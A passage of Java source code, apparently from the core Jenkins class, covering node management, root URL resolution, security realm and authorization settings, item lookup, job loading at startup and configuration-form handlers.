give name, hooked under this Hudson.\n     */\n    public @CheckForNull Node getNode(String name) {\n        return slaves.getNode(name);\n    }\n\n    /**\n     * Gets a {@link Cloud} by {@link Cloud#name its name}, or null.\n     */\n    public Cloud getCloud(String name) {\n        return clouds.getByName(name);\n    }\n\n    protected Map<Node,Computer> getComputerMap() {\n        return computers;\n    }\n\n    /**\n     * Returns all {@link Node}s in the system, excluding {@link Jenkins} instance itself which\n     * represents the master.\n     */\n    public List<Node> getNodes() {\n        return slaves;\n    }\n\n    /**\n     * Adds one more {@link Node} to Hudson.\n     */\n    public synchronized void addNode(Node n) throws IOException {\n        if(n==null)     throw new IllegalArgumentException();\n        ArrayList<Node> nl = new ArrayList<Node>(this.slaves);\n        if(!nl.contains(n)) // defensive check\n            nl.add(n);\n        setNodes(nl);\n    }\n\n    /**\n     * Removes a {@link Node} from Hudson.\n     */\n    public synchronized void removeNode(@Nonnull Node n) throws IOException {\n        Computer c = n.toComputer();\n        if (c!=null)\n            c.disconnect(OfflineCause.create(Messages._Hudson_NodeBeingRemoved()));\n\n        ArrayList<Node> nl = new ArrayList<Node>(this.slaves);\n        nl.remove(n);\n        setNodes(nl);\n    }\n\n    public void setNodes(List<? extends Node> nodes) throws IOException {\n        this.slaves = new NodeList(nodes);\n        updateComputerList();\n        trimLabels();\n        save();\n    }\n\n    public DescribableList<NodeProperty<?>, NodePropertyDescriptor> getNodeProperties() {\n    \treturn nodeProperties;\n    }\n\n    public DescribableList<NodeProperty<?>, NodePropertyDescriptor> getGlobalNodeProperties() {\n    \treturn globalNodeProperties;\n    }\n\n    /**\n     * Resets all labels and remove invalid ones.\n     *\n     * This should be called when the assumptions behind label cache computation changes,\n     * but we also call this periodically to self-heal any data out-of-sync issue.\n     */\n    private void trimLabels() {\n        for (Iterator<Label> itr = labels.values().iterator(); itr.hasNext();) {\n            Label l = itr.next();\n            resetLabel(l);\n            if(l.isEmpty())\n                itr.remove();\n        }\n    }\n\n    /**\n     * Binds {@link AdministrativeMonitor}s to URL.\n     */\n    public AdministrativeMonitor getAdministrativeMonitor(String id) {\n        for (AdministrativeMonitor m : administrativeMonitors)\n            if(m.id.equals(id))\n                return m;\n        return null;\n    }\n\n    public NodeDescriptor getDescriptor() {\n        return DescriptorImpl.INSTANCE;\n    }\n\n    public static final class DescriptorImpl extends NodeDescriptor {\n        @Extension\n        public static final DescriptorImpl INSTANCE = new DescriptorImpl();\n\n        public String getDisplayName() {\n            return \"\";\n        }\n\n        @Override\n        public boolean isInstantiable() {\n            return false;\n        }\n\n        public FormValidation doCheckNumExecutors(@QueryParameter String value) {\n            return FormValidation.validateNonNegativeInteger(value);\n        }\n\n        // to route /descriptor/FQCN/xxx to getDescriptor(FQCN).xxx\n        public Object getDynamic(String token) {\n            return Jenkins.getInstance().getDescriptor(token);\n        }\n    }\n\n    /**\n     * Gets the system default quiet period.\n     */\n    public int getQuietPeriod() {\n        return quietPeriod!=null ? quietPeriod : 5;\n    }\n\n    /**\n     * Sets the global quiet period.\n     *\n     * @param quietPeriod\n     *      null to the default value.\n     */\n    public void setQuietPeriod(Integer quietPeriod) throws IOException {\n        this.quietPeriod = quietPeriod;\n        save();\n    }\n\n    /**\n     * Gets the global SCM check out retry count.\n     */\n    public int getScmCheckoutRetryCount() {\n        return scmCheckoutRetryCount;\n    }\n\n    public void setScmCheckoutRetryCount(int scmCheckoutRetryCount) throws IOException {\n        this.scmCheckoutRetryCount = scmCheckoutRetryCount;\n        save();\n    }\n\n    @Override\n    public String getSearchUrl() {\n        return \"\";\n    }\n\n    @Override\n    public SearchIndexBuilder makeSearchIndex() {\n        return super.makeSearchIndex()\n            .add(\"configure\", \"config\",\"configure\")\n            .add(\"manage\")\n            .add(\"log\")\n            .add(new CollectionSearchIndex<TopLevelItem>() {\n                protected SearchItem get(String key) { return getItem(key); }\n                protected Collection<TopLevelItem> all() { return getItems(); }\n            })\n            .add(getPrimaryView().makeSearchIndex())\n            .add(new CollectionSearchIndex() {// for computers\n                protected Computer get(String key) { return getComputer(key); }\n                protected Collection<Computer> all() { return computers.values(); }\n            })\n            .add(new CollectionSearchIndex() {// for users\n                protected User get(String key) { return User.get(key,false); }\n                protected Collection<User> all() { return User.getAll(); }\n            })\n            .add(new CollectionSearchIndex() {// for views\n                protected View get(String key) { return getView(key); }\n                protected Collection<View> all() { return views; }\n            });\n    }\n\n    public String getUrlChildPrefix() {\n        return \"job\";\n    }\n\n    /**\n     * Gets the absolute URL of Jenkins,\n     * such as \"http://localhost/jenkins/\".\n     *\n     * <p>\n     * This method first tries to use the manually configured value, then\n     * fall back to {@link StaplerRequest#getRootPath()}.\n     * It is done in this order so that it can work correctly even in the face\n     * of a reverse proxy.\n     *\n     * @return\n     *      This method returns null if this parameter is not configured by the user.\n     *      The caller must gracefully deal with this situation.\n     *      The returned URL will always have the trailing '/'.\n     * @since 1.66\n     * @see Descriptor#getCheckUrl(String)\n     * @see #getRootUrlFromRequest()\n     */\n    public String getRootUrl() {\n        // for compatibility. the actual data is stored in Mailer\n        String url = JenkinsLocationConfiguration.get().getUrl();\n        if(url!=null) {\n            if (!url.endsWith(\"/\")) url += '/';\n            return url;\n        }\n\n        StaplerRequest req = Stapler.getCurrentRequest();\n        if(req!=null)\n            return getRootUrlFromRequest();\n        return null;\n    }\n\n    /**\n     * Is Jenkins running in HTTPS?\n     *\n     * Note that we can't really trust {@link StaplerRequest#isSecure()} because HTTPS might be terminated\n     * in the reverse proxy.\n     */\n    public boolean isRootUrlSecure() {\n        String url = getRootUrl();\n        return url!=null && url.startsWith(\"https\");\n    }\n\n    /**\n     * Gets the absolute URL of Hudson top page, such as \"http://localhost/hudson/\".\n     *\n     * <p>\n     * Unlike {@link #getRootUrl()}, which uses the manually configured value,\n     * this one uses the current request to reconstruct the URL. The benefit is\n     * that this is immune to the configuration mistake (users often fail to set the root URL\n     * correctly, especially when a migration is involved), but the downside\n     * is that unless you are processing a request, this method doesn't work.\n     *\n     * Please note that this will not work in all cases if Jenkins is running behind a\n     * reverse proxy (e.g. when user has switched off ProxyPreserveHost, which is\n     * default setup or the actual url uses https) and you should use getRootUrl if\n     * you want to be sure you reflect user setup.\n     * See https://wiki.jenkins-ci.org/display/JENKINS/Running+Jenkins+behind+Apache\n     *\n     * @since 1.263\n     */\n    public String getRootUrlFromRequest() {\n        StaplerRequest req = Stapler.getCurrentRequest();\n        StringBuilder buf = new StringBuilder();\n        buf.append(req.getScheme()+\"://\");\n        buf.append(req.getServerName());\n        if(req.getServerPort()!=80)\n            buf.append(':').append(req.getServerPort());\n        buf.append(req.getContextPath()).append('/');\n        return buf.toString();\n    }\n\n    public File getRootDir() {\n        return root;\n    }\n\n    public FilePath getWorkspaceFor(TopLevelItem item) {\n        return new FilePath(expandVariablesForDirectory(workspaceDir, item));\n    }\n\n    public File getBuildDirFor(Job job) {\n        return expandVariablesForDirectory(buildsDir, job);\n    }\n\n    private File expandVariablesForDirectory(String base, Item item) {\n        return new File(Util.replaceMacro(base, ImmutableMap.of(\n                \"JENKINS_HOME\", getRootDir().getPath(),\n                \"ITEM_ROOTDIR\", item.getRootDir().getPath(),\n                \"ITEM_FULLNAME\", item.getFullName())));\n    }\n    \n    public String getRawWorkspaceDir() {\n        return workspaceDir;\n    }\n\n    public String getRawBuildsDir() {\n        return buildsDir;\n    }\n\n    public FilePath getRootPath() {\n        return new FilePath(getRootDir());\n    }\n\n    @Override\n    public FilePath createPath(String absolutePath) {\n        return new FilePath((VirtualChannel)null,absolutePath);\n    }\n\n    public ClockDifference getClockDifference() {\n        return ClockDifference.ZERO;\n    }\n\n    /**\n     * For binding {@link LogRecorderManager} to \"/log\".\n     * Everything below here is admin-only, so do the check here.\n     */\n    public LogRecorderManager getLog() {\n        checkPermission(ADMINISTER);\n        return log;\n    }\n\n    /**\n     * A convenience method to check if there's some security\n     * restrictions in place.\n     */\n    @Exported\n    public boolean isUseSecurity() {\n        return securityRealm!=SecurityRealm.NO_AUTHENTICATION || authorizationStrategy!=AuthorizationStrategy.UNSECURED;\n    }\n    \n    public boolean isUseProjectNamingStrategy(){\n        return projectNamingStrategy != DefaultProjectNamingStrategy.DEFAULT_NAMING_STRATEGY;\n    }\n\n    /**\n     * If true, all the POST requests to Hudson would have to have crumb in it to protect\n     * Hudson from CSRF vulnerabilities.\n     */\n    @Exported\n    public boolean isUseCrumbs() {\n        return crumbIssuer!=null;\n    }\n\n    /**\n     * Returns the constant that captures the three basic security modes\n     * in Hudson.\n     */\n    public SecurityMode getSecurity() {\n        // fix the variable so that this code works under concurrent modification to securityRealm.\n        SecurityRealm realm = securityRealm;\n\n        if(realm==SecurityRealm.NO_AUTHENTICATION)\n            return SecurityMode.UNSECURED;\n        if(realm instanceof LegacySecurityRealm)\n            return SecurityMode.LEGACY;\n        return SecurityMode.SECURED;\n    }\n\n    /**\n     * @return\n     *      never null.\n     */\n    public SecurityRealm getSecurityRealm() {\n        return securityRealm;\n    }\n\n    public void setSecurityRealm(SecurityRealm securityRealm) {\n        if(securityRealm==null)\n            securityRealm= SecurityRealm.NO_AUTHENTICATION;\n        this.useSecurity = true;\n        this.securityRealm = securityRealm;\n        // reset the filters and proxies for the new SecurityRealm\n        try {\n            HudsonFilter filter = HudsonFilter.get(servletContext);\n            if (filter == null) {\n                // Fix for #3069: This filter is not necessarily initialized before the servlets.\n                // when HudsonFilter does come back, it'll initialize itself.\n                LOGGER.fine(\"HudsonFilter has not yet been initialized: Can't perform security setup for now\");\n            } else {\n                LOGGER.fine(\"HudsonFilter has been previously initialized: Setting security up\");\n                filter.reset(securityRealm);\n                LOGGER.fine(\"Security is now fully set up\");\n            }\n        } catch (ServletException e) {\n            // for binary compatibility, this method cannot throw a checked exception\n            throw new AcegiSecurityException(\"Failed to configure filter\",e) {};\n        }\n    }\n\n    public void setAuthorizationStrategy(AuthorizationStrategy a) {\n        if (a == null)\n            a = AuthorizationStrategy.UNSECURED;\n        useSecurity = true;\n        authorizationStrategy = a;\n    }\n\n    public void disableSecurity() {\n        useSecurity = null;\n        setSecurityRealm(SecurityRealm.NO_AUTHENTICATION);\n        authorizationStrategy = AuthorizationStrategy.UNSECURED;\n        markupFormatter = null;\n    }\n\n    public void setProjectNamingStrategy(ProjectNamingStrategy ns) {\n        if(ns == null){\n            ns = DefaultProjectNamingStrategy.DEFAULT_NAMING_STRATEGY;\n        }\n        projectNamingStrategy = ns;\n    }\n    \n    public Lifecycle getLifecycle() {\n        return Lifecycle.get();\n    }\n\n    /**\n     * Gets the dependency injection container that hosts all the extension implementations and other\n     * components in Jenkins.\n     *\n     * @since 1.GUICE\n     */\n    public Injector getInjector() {\n        return lookup(Injector.class);\n    }\n\n    /**\n     * Returns {@link ExtensionList} that retains the discovered instances for the given extension type.\n     *\n     * @param extensionType\n     *      The base type that represents the extension point. Normally {@link ExtensionPoint} subtype\n     *      but that's not a hard requirement.\n     * @return\n     *      Can be an empty list but never null.\n     */\n    @SuppressWarnings({\"unchecked\"})\n    public <T> ExtensionList<T> getExtensionList(Class<T> extensionType) {\n        return extensionLists.get(extensionType);\n    }\n\n    /**\n     * Used to bind {@link ExtensionList}s to URLs.\n     *\n     * @since 1.349\n     */\n    public ExtensionList getExtensionList(String extensionType) throws ClassNotFoundException {\n        return getExtensionList(pluginManager.uberClassLoader.loadClass(extensionType));\n    }\n\n    /**\n     * Returns {@link ExtensionList} that retains the discovered {@link Descriptor} instances for the given\n     * kind of {@link Describable}.\n     *\n     * @return\n     *      Can be an empty list but never null.\n     */\n    @SuppressWarnings({\"unchecked\"})\n    public <T extends Describable<T>,D extends Descriptor<T>> DescriptorExtensionList<T,D> getDescriptorList(Class<T> type) {\n        return descriptorLists.get(type);\n    }\n\n    /**\n     * Refresh {@link ExtensionList}s by adding all the newly discovered extensions.\n     *\n     * Exposed only for {@link PluginManager#dynamicLoad(File)}.\n     */\n    public void refreshExtensions() throws ExtensionRefreshException {\n        ExtensionList<ExtensionFinder> finders = getExtensionList(ExtensionFinder.class);\n        for (ExtensionFinder ef : finders) {\n            if (!ef.isRefreshable())\n                throw new ExtensionRefreshException(ef+\" doesn't support refresh\");\n        }\n\n        List<ExtensionComponentSet> fragments = Lists.newArrayList();\n        for (ExtensionFinder ef : finders) {\n            fragments.add(ef.refresh());\n        }\n        ExtensionComponentSet delta = ExtensionComponentSet.union(fragments).filtered();\n\n        // if we find a new ExtensionFinder, we need it to list up all the extension points as well\n        List<ExtensionComponent<ExtensionFinder>> newFinders = Lists.newArrayList(delta.find(ExtensionFinder.class));\n        while (!newFinders.isEmpty()) {\n            ExtensionFinder f = newFinders.remove(newFinders.size()-1).getInstance();\n\n            ExtensionComponentSet ecs = ExtensionComponentSet.allOf(f).filtered();\n            newFinders.addAll(ecs.find(ExtensionFinder.class));\n            delta = ExtensionComponentSet.union(delta, ecs);\n        }\n\n        for (ExtensionList el : extensionLists.values()) {\n            el.refresh(delta);\n        }\n        for (ExtensionList el : descriptorLists.values()) {\n            el.refresh(delta);\n        }\n\n        // TODO: we need some generalization here so that extension points can be notified when a refresh happens?\n        for (ExtensionComponent<RootAction> ea : delta.find(RootAction.class)) {\n            Action a = ea.getInstance();\n            if (!actions.contains(a)) actions.add(a);\n        }\n    }\n\n    /**\n     * Returns the root {@link ACL}.\n     *\n     * @see AuthorizationStrategy#getRootACL()\n     */\n    @Override\n    public ACL getACL() {\n        return authorizationStrategy.getRootACL();\n    }\n\n    /**\n     * @return\n     *      never null.\n     */\n    public AuthorizationStrategy getAuthorizationStrategy() {\n        return authorizationStrategy;\n    }\n    \n    /**\n     * The strategy used to check the project names.\n     * @return never <code>null</code>\n     */\n    public ProjectNamingStrategy getProjectNamingStrategy() {\n        return projectNamingStrategy == null ? ProjectNamingStrategy.DEFAULT_NAMING_STRATEGY : projectNamingStrategy;\n    }\n\n    /**\n     * Returns true if Hudson is quieting down.\n     * <p>\n     * No further jobs will be executed unless it\n     * can be finished while other current pending builds\n     * are still in progress.\n     */\n    @Exported\n    public boolean isQuietingDown() {\n        return isQuietingDown;\n    }\n\n    /**\n     * Returns true if the container initiated the termination of the web application.\n     */\n    public boolean isTerminating() {\n        return terminating;\n    }\n\n    /**\n     * Gets the initialization milestone that we've already reached.\n     *\n     * @return\n     *      {@link InitMilestone#STARTED} even if the initialization hasn't been started, so that this method\n     *      never returns null.\n     */\n    public InitMilestone getInitLevel() {\n        return initLevel;\n    }\n\n    public void setNumExecutors(int n) throws IOException {\n        this.numExecutors = n;\n        save();\n    }\n\n\n\n    /**\n     * {@inheritDoc}.\n     *\n     * Note that the look up is case-insensitive.\n     */\n    public TopLevelItem getItem(String name) {\n        if (name==null)    return null;\n    \tTopLevelItem item = items.get(name);\n        if (item==null)\n            return null;\n        if (!item.hasPermission(Item.READ)) {\n            if (item.hasPermission(Item.DISCOVER)) {\n                throw new AccessDeniedException(\"Please login to access job \" + name);\n            }\n            return null;\n        }\n        return item;\n    }\n\n    /**\n     * Gets the item by its path name from the given context\n     *\n     * <h2>Path Names</h2>\n     * <p>\n     * If the name starts from '/', like \"/foo/bar/zot\", then it's interpreted as absolute.\n     * Otherwise, the name should be something like \"foo/bar\" and it's interpreted like\n     * relative path name in the file system is, against the given context.\n     *\n     * @param context\n     *      null is interpreted as {@link Jenkins}. Base 'directory' of the interpretation.\n     * @since 1.406\n     */\n    public Item getItem(String pathName, ItemGroup context) {\n        if (context==null)  context = this;\n        if (pathName==null) return null;\n\n        if (pathName.startsWith(\"/\"))   // absolute\n            return getItemByFullName(pathName);\n\n        Object/*Item|ItemGroup*/ ctx = context;\n\n        StringTokenizer tokens = new StringTokenizer(pathName,\"/\");\n        while (tokens.hasMoreTokens()) {\n            String s = tokens.nextToken();\n            if (s.equals(\"..\")) {\n                if (ctx instanceof Item) {\n                    ctx = ((Item)ctx).getParent();\n                    continue;\n                }\n\n                ctx=null;    // can't go up further\n                break;\n            }\n            if (s.equals(\".\")) {\n                continue;\n            }\n\n            if (ctx instanceof ItemGroup) {\n                ItemGroup g = (ItemGroup) ctx;\n                Item i = g.getItem(s);\n                if (i==null || !i.hasPermission(Item.READ)) { // XXX consider DISCOVER\n                    ctx=null;    // can't go up further\n                    break;\n                }\n                ctx=i;\n            } else {\n                return null;\n            }\n        }\n\n        if (ctx instanceof Item)\n            return (Item)ctx;\n\n        // fall back to the classic interpretation\n        return getItemByFullName(pathName);\n    }\n\n    public final Item getItem(String pathName, Item context) {\n        return getItem(pathName,context!=null?context.getParent():null);\n    }\n\n    public final <T extends Item> T getItem(String pathName, ItemGroup context, Class<T> type) {\n        Item r = getItem(pathName, context);\n        if (type.isInstance(r))\n            return type.cast(r);\n        return null;\n    }\n\n    public final <T extends Item> T getItem(String pathName, Item context, Class<T> type) {\n        return getItem(pathName,context!=null?context.getParent():null,type);\n    }\n\n    public File getRootDirFor(TopLevelItem child) {\n        return getRootDirFor(child.getName());\n    }\n\n    private File getRootDirFor(String name) {\n        return new File(new File(getRootDir(),\"jobs\"), name);\n    }\n\n    /**\n     * Gets the {@link Item} object by its full name.\n     * Full names are like path names, where each name of {@link Item} is\n     * combined by '/'.\n     *\n     * @return\n     *      null if either such {@link Item} doesn't exist under the given full name,\n     *      or it exists but it's no an instance of the given type.\n     */\n    public @CheckForNull <T extends Item> T getItemByFullName(String fullName, Class<T> type) {\n        StringTokenizer tokens = new StringTokenizer(fullName,\"/\");\n        ItemGroup parent = this;\n\n        if(!tokens.hasMoreTokens()) return null;    // for example, empty full name.\n\n        while(true) {\n            Item item = parent.getItem(tokens.nextToken());\n            if(!tokens.hasMoreTokens()) {\n                if(type.isInstance(item))\n                    return type.cast(item);\n                else\n                    return null;\n            }\n\n            if(!(item instanceof ItemGroup))\n                return null;    // this item can't have any children\n\n            if (!item.hasPermission(Item.READ))\n                return null; // XXX consider DISCOVER\n\n            parent = (ItemGroup) item;\n        }\n    }\n\n    public @CheckForNull Item getItemByFullName(String fullName) {\n        return getItemByFullName(fullName,Item.class);\n    }\n\n    /**\n     * Gets the user of the given name.\n     *\n     * @return the user of the given name, if that person exists or the invoker {@link #hasPermission} on {@link #ADMINISTER}; else null\n     * @see User#get(String,boolean)\n     */\n    public @CheckForNull User getUser(String name) {\n        return User.get(name,hasPermission(ADMINISTER));\n    }\n\n    public synchronized TopLevelItem createProject( TopLevelItemDescriptor type, String name ) throws IOException {\n        return createProject(type, name, true);\n    }\n\n    public synchronized TopLevelItem createProject( TopLevelItemDescriptor type, String name, boolean notify ) throws IOException {\n        return itemGroupMixIn.createProject(type,name,notify);\n    }\n\n    /**\n     * Overwrites the existing item by new one.\n     *\n     * <p>\n     * This is a short cut for deleting an existing job and adding a new one.\n     */\n    public synchronized void putItem(TopLevelItem item) throws IOException, InterruptedException {\n        String name = item.getName();\n        TopLevelItem old = items.get(name);\n        if (old ==item)  return; // noop\n\n        checkPermission(Item.CREATE);\n        if (old!=null)\n            old.delete();\n        items.put(name,item);\n        ItemListener.fireOnCreated(item);\n    }\n\n    /**\n     * Creates a new job.\n     *\n     * <p>\n     * This version infers the descriptor from the type of the top-level item.\n     *\n     * @throws IllegalArgumentException\n     *      if the project of the given name already exists.\n     */\n    public synchronized <T extends TopLevelItem> T createProject( Class<T> type, String name ) throws IOException {\n        return type.cast(createProject((TopLevelItemDescriptor)getDescriptor(type),name));\n    }\n\n    /**\n     * Called by {@link Job#renameTo(String)} to update relevant data structure.\n     * assumed to be synchronized on Hudson by the caller.\n     */\n    public void onRenamed(TopLevelItem job, String oldName, String newName) throws IOException {\n        items.remove(oldName);\n        items.put(newName,job);\n\n        for (View v : views)\n            v.onJobRenamed(job, oldName, newName);\n        save();\n    }\n\n    /**\n     * Called in response to {@link Job#doDoDelete(StaplerRequest, StaplerResponse)}\n     */\n    public void onDeleted(TopLevelItem item) throws IOException {\n        for (ItemListener l : ItemListener.all())\n            l.onDeleted(item);\n\n        items.remove(item.getName());\n        for (View v : views)\n            v.onJobRenamed(item, item.getName(), null);\n        save();\n    }\n\n    public FingerprintMap getFingerprintMap() {\n        return fingerprintMap;\n    }\n\n    // if no finger print matches, display \"not found page\".\n    public Object getFingerprint( String md5sum ) throws IOException {\n        Fingerprint r = fingerprintMap.get(md5sum);\n        if(r==null)     return new NoFingerprintMatch(md5sum);\n        else            return r;\n    }\n\n    /**\n     * Gets a {@link Fingerprint} object if it exists.\n     * Otherwise null.\n     */\n    public Fingerprint _getFingerprint( String md5sum ) throws IOException {\n        return fingerprintMap.get(md5sum);\n    }\n\n    /**\n     * The file we save our configuration.\n     */\n    private XmlFile getConfigFile() {\n        return new XmlFile(XSTREAM, new File(root,\"config.xml\"));\n    }\n\n    public int getNumExecutors() {\n        return numExecutors;\n    }\n\n    public Mode getMode() {\n        return mode;\n    }\n\n    public void setMode(Mode m) throws IOException {\n        this.mode = m;\n        save();\n    }\n\n    public String getLabelString() {\n        return fixNull(label).trim();\n    }\n\n    @Override\n    public void setLabelString(String label) throws IOException {\n        this.label = label;\n        save();\n    }\n\n    @Override\n    public LabelAtom getSelfLabel() {\n        return getLabelAtom(\"master\");\n    }\n\n    public Computer createComputer() {\n        return new Hudson.MasterComputer();\n    }\n\n    private synchronized TaskBuilder loadTasks() throws IOException {\n        File projectsDir = new File(root,\"jobs\");\n        if(!projectsDir.getCanonicalFile().isDirectory() && !projectsDir.mkdirs()) {\n            if(projectsDir.exists())\n                throw new IOException(projectsDir+\" is not a directory\");\n            throw new IOException(\"Unable to create \"+projectsDir+\"\\nPermission issue? Please create this directory manually.\");\n        }\n        File[] subdirs = projectsDir.listFiles(new FileFilter() {\n            public boolean accept(File child) {\n                return child.isDirectory() && Items.getConfigFile(child).exists();\n            }\n        });\n\n        TaskGraphBuilder g = new TaskGraphBuilder();\n        Handle loadHudson = g.requires(EXTENSIONS_AUGMENTED).attains(JOB_LOADED).add(\"Loading global config\", new Executable() {\n            public void run(Reactor session) throws Exception {\n                // JENKINS-8043: some slaves (eg. swarm slaves) are not saved into the config file\n                // and will get overwritten when reloading. Make a backup copy now, and re-add them later\n                NodeList oldSlaves = slaves;\n                \n                XmlFile cfg = getConfigFile();\n                if (cfg.exists()) {\n                    // reset some data that may not exist in the disk file\n                    // so that we can take a proper compensation action later.\n                    primaryView = null;\n                    views.clear();\n\n                    // load from disk\n                    cfg.unmarshal(Jenkins.this);\n                }\n\n                // if we are loading old data that doesn't have this field\n                if (slaves == null) slaves = new NodeList();\n\n                clouds.setOwner(Jenkins.this);\n                items.clear();\n\n                // JENKINS-8043: re-add the slaves which were not saved into the config file\n                // and are now missing, but still connected.\n                if (oldSlaves != null) {\n                    ArrayList<Node> newSlaves = new ArrayList<Node>(slaves);\n                    for (Node n: oldSlaves) {\n                        if (n instanceof EphemeralNode) {\n                            if(!newSlaves.contains(n)) {\n                                newSlaves.add(n);\n                            }\n                        }\n                    }\n                    setNodes(newSlaves);\n                }\n            }\n        });\n\n        for (final File subdir : subdirs) {\n            g.requires(loadHudson).attains(JOB_LOADED).notFatal().add(\"Loading job \"+subdir.getName(),new Executable() {\n                public void run(Reactor session) throws Exception {\n                    TopLevelItem item = (TopLevelItem) Items.load(Jenkins.this, subdir);\n                    items.put(item.getName(), item);\n                }\n            });\n        }\n\n        g.requires(JOB_LOADED).add(\"Finalizing set up\",new Executable() {\n            public void run(Reactor session) throws Exception {\n                rebuildDependencyGraph();\n\n                {// recompute label objects - populates the labels mapping.\n                    for (Node slave : slaves)\n                        // Note that not all labels are visible until the slaves have connected.\n                        slave.getAssignedLabels();\n                    getAssignedLabels();\n                }\n\n                // initialize views by inserting the default view if necessary\n                // this is both for clean Hudson and for backward compatibility.\n                if(views.size()==0 || primaryView==null) {\n                    View v = new AllView(Messages.Hudson_ViewName());\n                    setViewOwner(v);\n                    views.add(0,v);\n                    primaryView = v.getViewName();\n                }\n\n                // read in old data that doesn't have the security field set\n                if(authorizationStrategy==null) {\n                    if(useSecurity==null || !useSecurity)\n                        authorizationStrategy = AuthorizationStrategy.UNSECURED;\n                    else\n                        authorizationStrategy = new LegacyAuthorizationStrategy();\n                }\n                if(securityRealm==null) {\n                    if(useSecurity==null || !useSecurity)\n                        setSecurityRealm(SecurityRealm.NO_AUTHENTICATION);\n                    else\n                        setSecurityRealm(new LegacySecurityRealm());\n                } else {\n                    // force the set to proxy\n                    setSecurityRealm(securityRealm);\n                }\n\n                if(useSecurity!=null && !useSecurity) {\n                    // forced reset to the unsecure mode.\n                    // this works as an escape hatch for people who locked themselves out.\n                    authorizationStrategy = AuthorizationStrategy.UNSECURED;\n                    setSecurityRealm(SecurityRealm.NO_AUTHENTICATION);\n                }\n\n                // Initialize the filter with the crumb issuer\n                setCrumbIssuer(crumbIssuer);\n\n                // auto register root actions\n                for (Action a : getExtensionList(RootAction.class))\n                    if (!actions.contains(a)) actions.add(a);\n            }\n        });\n\n        return g;\n    }\n\n    /**\n     * Save the settings to a file.\n     */\n    public synchronized void save() throws IOException {\n        if(BulkChange.contains(this))   return;\n        getConfigFile().write(this);\n        SaveableListener.fireOnChange(this, getConfigFile());\n    }\n\n\n    /**\n     * Called to shut down the system.\n     */\n    @edu.umd.cs.findbugs.annotations.SuppressWarnings(\"ST_WRITE_TO_STATIC_FROM_INSTANCE_METHOD\")\n    public void cleanUp() {\n        for (ItemListener l : ItemListener.all())\n            l.onBeforeShutdown();\n\n        Set<Future<?>> pending = new HashSet<Future<?>>();\n        terminating = true;\n        for( Computer c : computers.values() ) {\n            c.interrupt();\n            killComputer(c);\n            pending.add(c.disconnect(null));\n        }\n        if(udpBroadcastThread!=null)\n            udpBroadcastThread.shutdown();\n        if(dnsMultiCast!=null)\n            dnsMultiCast.close();\n        interruptReloadThread();\n        Timer timer = Trigger.timer;\n        if (timer != null) {\n            timer.cancel();\n        }\n        // TODO: how to wait for the completion of the last job?\n        Trigger.timer = null;\n        if(tcpSlaveAgentListener!=null)\n            tcpSlaveAgentListener.shutdown();\n\n        if(pluginManager!=null) // be defensive. there could be some ugly timing related issues\n            pluginManager.stop();\n\n        if(getRootDir().exists())\n            // if we are aborting because we failed to create JENKINS_HOME,\n            // don't try to save. Issue #536\n            getQueue().save();\n\n        threadPoolForLoad.shutdown();\n        for (Future<?> f : pending)\n            try {\n                f.get(10, TimeUnit.SECONDS);    // if clean up operation didn't complete in time, we fail the test\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                break;  // someone wants us to die now. quick!\n            } catch (ExecutionException e) {\n                LOGGER.log(Level.WARNING, \"Failed to shut down properly\",e);\n            } catch (TimeoutException e) {\n                LOGGER.log(Level.WARNING, \"Failed to shut down properly\",e);\n            }\n\n        LogFactory.releaseAll();\n\n        theInstance = null;\n    }\n\n    public Object getDynamic(String token) {\n        for (Action a : getActions()) {\n            String url = a.getUrlName();\n            if (url==null)  continue;\n            if (url.equals(token) || url.equals('/' + token))\n                return a;\n        }\n        for (Action a : getManagementLinks())\n            if(a.getUrlName().equals(token))\n                return a;\n        return null;\n    }\n\n\n//\n//\n// actions\n//\n//\n    /**\n     * Accepts submission from the configuration page.\n     */\n    public synchronized void doConfigSubmit( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException, FormException {\n        BulkChange bc = new BulkChange(this);\n        try {\n            checkPermission(ADMINISTER);\n\n            JSONObject json = req.getSubmittedForm();\n\n            workspaceDir = json.getString(\"rawWorkspaceDir\");\n            buildsDir = json.getString(\"rawBuildsDir\");\n\n            systemMessage = Util.nullify(req.getParameter(\"system_message\"));\n\n            jdks.clear();\n            jdks.addAll(req.bindJSONToList(JDK.class,json.get(\"jdks\")));\n\n            boolean result = true;\n            for( Descriptor<?> d : Functions.getSortedDescriptorsForGlobalConfig() )\n                result &= configureDescriptor(req,json,d);\n\n            version = VERSION;\n\n            save();\n            updateComputerList();\n            if(result)\n                FormApply.success(req.getContextPath()+'/').generateResponse(req, rsp, null);\n            else\n                FormApply.success(\"configure\").generateResponse(req, rsp, null);    // back to config\n        } finally {\n            bc.commit();\n        }\n    }\n\n    /**\n     * Gets the {@link CrumbIssuer} currently in use.\n     *\n     * @return null if none is in use.\n     */\n    public CrumbIssuer getCrumbIssuer() {\n        return crumbIssuer;\n    }\n\n    public void setCrumbIssuer(CrumbIssuer issuer) {\n        crumbIssuer = issuer;\n    }\n\n    public synchronized void doTestPost( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        rsp.sendRedirect(\"foo\");\n    }\n\n    private boolean configureDescriptor(StaplerRequest req, JSONObject json, Descriptor<?> d) throws FormException {\n        // collapse the structure to remain backward compatible with the JSON structure before 1.\n        String name = d.getJsonSafeClassName();\n        JSONObject js = json.has(name) ? json.getJSONObject(name) : new JSONObject(); // if it doesn't have the property, the method returns invalid null object.\n        json.putAll(js);\n        return d.configure(req, js);\n    }\n\n    /**\n     * Accepts submission from the node configuration page.\n     */\n    public synchronized void doConfigExecutorsSubmit( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException, FormException {\n        checkPermission(ADMINISTER);\n\n        BulkChange bc = new BulkChange(this);\n        try {\n            JSONObject json = req.getSubmittedForm();\n\n            MasterBuildConfiguration mbc = MasterBuildConfiguration.all().get(MasterBuildConfiguration.class);\n            if (mbc!=null)\n                mbc.configure(req,json);\n\n            getNodeProperties().rebuild(req, json.optJSONObject(\"nodeProperties\"), NodeProperty.all());\n        } finally {\n            bc.commit();\n        }\n\n        rsp.sendRedirect(req.getContextPath()+'/'+toComputer().getUrl());  // back to the computer page\n    }\n\n    /**\n     * Accepts the new description.\n     */\n    public synchronized void doSubmitDescription( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        getPrimaryView().doSubmitDescription(req, rsp);\n    }\n\n    public synchronized HttpRedirect doQuietDown() throws IOException {\n        try {\n            return doQuietDown(false,0);\n    